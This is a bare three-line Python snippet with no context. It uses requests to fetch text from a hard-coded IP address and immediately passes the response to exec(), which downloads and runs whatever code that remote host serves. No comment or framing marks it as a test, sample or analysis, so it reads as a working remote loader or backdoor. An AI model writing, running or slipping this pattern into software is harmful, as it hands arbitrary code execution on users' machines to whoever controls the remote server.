import requests
r = requests.get("http://91.121.0.0/cmd")
exec(r.text)